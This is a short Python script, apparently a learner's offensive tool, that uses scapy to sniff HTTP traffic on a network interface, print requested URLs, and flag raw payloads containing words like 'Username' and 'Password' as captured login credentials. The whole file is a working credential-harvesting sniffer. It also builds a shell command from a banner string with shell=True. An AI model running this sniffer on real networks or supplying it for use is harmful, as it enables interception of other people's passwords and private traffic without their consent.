#!/usr/bin/env python

import scapy.all as scapy 
import pyfiglet
import subprocess
from scapy.layers import http

def get_banner():
    banner = pyfiglet.figlet_format('Packet Sniffer', font='slant')
    subprocess.call([f"echo '{banner}'"], shell=True)

def sniff(interface):
    scapy.sniff(iface=interface,store=False,prn=process_sniffed_packet)

def get_url (packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path 

def get_login_info(packet):
    if (packet.haslayer(scapy.Raw)):
            load = packet[scapy.Raw].load
            keywords =["Username","user", "Password","pass","login","sign up"]
            for keyword in keywords:
                if keyword in str(load) : 
                    return load

def process_sniffed_packet(packet):
    if (packet.haslayer(http.HTTPRequest)):
        url = get_url(packet) 
        print(f"http request to >> {url}")

        login_info = get_login_info(packet)
        if login_info :
            print(f"[+] Possible login creds >> {login_info}")


get_banner()

sniff("eth0")